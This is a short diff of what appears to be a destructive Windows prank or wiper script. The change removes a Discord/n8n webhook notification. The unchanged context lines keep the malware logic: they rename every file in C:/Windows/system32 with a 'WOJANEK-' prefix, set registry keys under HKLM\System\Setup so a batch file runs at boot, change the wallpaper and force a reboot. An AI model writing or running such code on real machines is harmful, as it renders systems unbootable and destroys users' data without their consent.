@@ -32,9 +32,6 @@ width = win32api.GetSystemMetrics(0)
 height = win32api.GetSystemMetrics(1)
 SQUARE = 128
 
-discord = False
-n8n_webhook = ""
-
 assets = {}
 
 def real_file():
@@ -251,8 +248,6 @@ if(second_phase):
                 for g in glob.glob("C:/Windows/system32/*.*"):
                     c = g.replace(os.path.basename(g), "WOJANEK-" + "".join(random.choice(string.hexdigits) for i in range(8)) + "." + os.path.basename(g).split(".")[-1])
                     files += f"move \"{g}\" \"{c}\" > nul\n"
-                if(discord):
-                    requests.get(n8n_webhook)
                 commands = [
                     'reg add HKLM\\System\\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\\dosexecarm.bat" /f',
                     'reg add HKLM\\System\\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f',
@@ -417,4 +412,5 @@ shutdown -r -t 0
         print("[OK] dosexec.bat")
     
     ctypes.windll.user32.SystemParametersInfoW(20, 0, assets["wojanpic.png"], 0)
+
     os.system("shutdown -r -f -t 0")
